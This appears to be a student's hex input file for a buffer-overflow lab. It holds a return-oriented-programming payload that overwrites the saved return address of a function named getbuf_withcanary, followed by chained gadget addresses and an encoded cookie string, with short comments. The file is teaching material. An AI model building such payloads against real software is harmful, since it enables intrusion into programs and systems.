00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 // these above will be covered by the buf
c6 22 40 00 00 00 00 00 // this will replace the saved return address on the bottom of the stack of the function getbuf_withcanary
20 00 00 00 00 00 00 00 
72 23 40 00 00 00 00 00
03 24 40 00 00 00 00 00
68 23 40 00 00 00 00 00
25 23 40 00 00 00 00 00
b0 22 40 00 00 00 00 00
00 23 40 00 00 00 00 00
b0 22 40 00 00 00 00 00
da 20 40 00 00 00 00 00 
31 64 61 32 38 31 39 38 // same instructions as in phase_5
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
88 00 00 00 00 01 00 00 //len[0] = 0x88, len[1] = 0x100(actually we don't need so long)
//no more longer, will be of no use
